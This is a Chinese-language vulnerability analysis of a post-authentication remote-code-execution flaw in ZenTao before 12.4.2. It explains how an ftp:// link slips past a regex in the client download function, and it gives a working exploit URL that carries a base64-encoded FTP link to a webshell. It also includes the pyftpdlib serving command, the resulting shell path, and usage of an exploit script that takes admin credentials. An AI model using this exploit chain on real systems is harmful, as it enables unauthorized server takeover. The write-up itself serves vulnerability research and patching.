## 前记

本文将对禅道12.4.2后台getshell漏洞进行分析，距离该版本上线已经过去2个多月，本漏洞会对12.4.2之前的版本产生影响，目前已经在新版本中修复。在复现该漏洞的时候我也读过一些网上对于该漏洞复现的文章，但是通过反复测试我发现网上所述的方法在我的环境上并不能成功复现，不知是否有情况相同的小伙伴，所以我对于漏洞点进行了审计，并成功复现，下面我们一起来分析一下。

 

## 代码分析

首先该漏洞需要后台管理员权限，所以我们首先登陆至后台。通过下图我们可以看到登陆后的界面URL为：
`http://192.168.52.141/zentaopms/www/index.php?m=my&f=index`

![img](./iamge/t012b1edfbb5968327e.png)

我们看到后台界面分别对m以及f参数进行传参，那么不难猜出大概就是调用my类下的index方法，我们看一下该段的代码。

![img](./iamge/t0159e9407d7b4a59e9.png)

在/module/my/lang/zh-cn.php下可以看到存在指向index的方法，这验证了我们上面猜测是正确的，那么我们下面来看一下文件下载漏洞点的代码部分。

![img](./iamge/t01e389578003518177.png)

漏洞是发生在client类下的donwload函数中，我们定位函数至/module/client/control.php中找到该方法，本段代码大致意思就是会接收三个参数version、os、link，然后去调用**downloadZipPackage**方法进行文件下载操作，并对一些下载失败事件进行不同回显，比如downloadFail，saveClientError在上图的方法列表我们可以看到他们调用的方法的具体含义，这里就不再赘述，最后如果没有失败事件时间就会返回成功。在downloadZipPackage并不需要os方法，所以这在我们后期利用时也不需要传入该参数。

![img](https://p1.ssl.qhimg.com/t01bc3554884a1ddd3a.png)

然后继续跟进downloadZipPackage方法中，注意重点来了，漏洞真正的产生原因就在该方法中。

![img](./iamge/t01d664441732fb42e4.png)

我们可以看到这段代码首先对传入的link参数进行了base64解码操作，这里的link参数就是我们shell的远程地址，然后下面会通过一个正则表达式进行判断，link地址是否以 http:// 或者 https:// 开头，如果存在则return返回false并退出方法，否则调用方法**parent::downloadZipPackage**，这里其实忽略了FTP这一文件下载方法，也就是说我们可以通过FTP服务代替进行文件下载操作从而绕过正则的限制。

![img](./iamge/t01be4bcd3b62e34b7c.png)

downloadZipPackage方法就没有什么问题了，就是一段文件下载函数，会通过传入的version值创建并命名在data下创建的文件夹并将下载的文件保存在其中。

 

## 漏洞利用

那么这其实就是很清晰了，通过文章开始介绍的m和f参数的调用，我们可以对client类以及download参数进行调用，并传入download参数必要的version以及link参数就可以完成漏洞的利用了。这里的link地址是base64加密后的ftp连接地址，,比如:

**ftp://192.168.52.1/shell.php**

大家可以直接使用python的pyftpdlib模块开启FTP服务比较方便，命令:

**python -m pyftpdlib -p 21 -d .**默认开启匿名用户，不需要输入用户名密码。

![img](./iamge/t010ff8a21f7d431f36.png)

构建exp如下:

```
http://ip/zentaopms/www/index.php?m=client&f=download&version=1&link=ZnRwOi8vMTkyLjE2OC41Mi4xL3NoZWxsLnBocA==
```

可以看到回显弹窗保存成功，然后再到靶机中查看发现下载成功，保存路径至

```
/zentaopms/www/data/client/1/shell.php
```

![img](./iamge/t01e196a8e5fd936c20.png)

连接木马，成功利用！

![img](./iamge/t01f672108d970a681f.png)

 

## 漏洞利用EXP

![img](./iamge/t01af2b24af5c3ddc4c.png)

构建命令:`python "Zentao RCE EXP.py" -H http://192.168.52.141 -U admin -P Admin888 -f 192.168.52.1`

其中-H指定目标主机，-U指定后台用户名，-P指定密码，-f指定VMnet8网卡的IP，这样虚拟机才能正常访问到物理机的FTP服务，当然如果测试环境也在虚拟机中则可以修改源码自动获取IP即可。
